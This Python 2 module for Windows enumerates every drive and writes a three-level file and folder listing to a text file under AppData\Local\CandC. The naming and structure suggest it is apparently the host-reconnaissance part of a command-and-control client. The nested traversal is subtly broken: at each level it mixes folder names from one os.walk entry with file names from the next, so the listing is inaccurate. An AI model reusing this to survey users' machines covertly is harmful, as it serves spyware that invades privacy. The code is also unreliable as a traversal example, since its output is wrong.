import os
import win32api

SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
USERDATA_PATH = SAVE_FILES + "\\User Data\\"

class Directory():

    def __init__(self):
        pass

        
    def get_list_drives(self):
        print '[*] Getting list of available drives'
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print '[*] Returning list of drives'
        return drives

        
    def DriveTree(self):
        print '[*] Making directory tree'
        drives = self.get_list_drives()
        file_name = USERDATA_PATH + 'DirectoryTree.txt'
        no_of_drives = len(drives)
        file_dir_O = open(file_name, "w")

        for d in range(no_of_drives):
            try:
                file_dir_O.write(str(drives[d]) + "\n")
                directories = os.walk(drives[d])
                next_dir = next(directories)

                next_directories = next_dir[1]
                next_files = next_dir[2]

                next_final_dir = next_directories + next_files

                for nd in next_final_dir:
                    file_dir_O.write("	" + str(nd) + "\n")
                    try:
                        sub_directories = os.walk(drives[d] + nd)

                        next_sub_dir = next(sub_directories)[1]
                        next_sub_sub_file = next(sub_directories)[2]

                        next_final_final_dir = next_sub_dir + next_sub_sub_file

                        for nsd in next_final_final_dir:
                            file_dir_O.write("		" + str(nsd) + "\n")

                            try:
                                sub_sub_directories = os.walk(drives[d] + nd + '\\' + nsd)

                                next_sub_sub_dir = next(sub_sub_directories)[1]
                                next_sub_sub_sub_file = next(sub_sub_directories)[2]

                                next_final_final_final_dir = next_sub_sub_dir + next_sub_sub_sub_file

                                for nssd in next_final_final_final_dir:
                                    file_dir_O.write("			" + str(nssd) + "\n")
                            except Exception as e:
                                pass

                    except Exception as e:
                        # print '==> Error in making directory tree'
                        print e
            except Exception as e:
                pass

        file_dir_O.close()
        print '[*] Directory tree generated succesfully'
        return True
 
 
    def run(self):
        self.DriveTree()
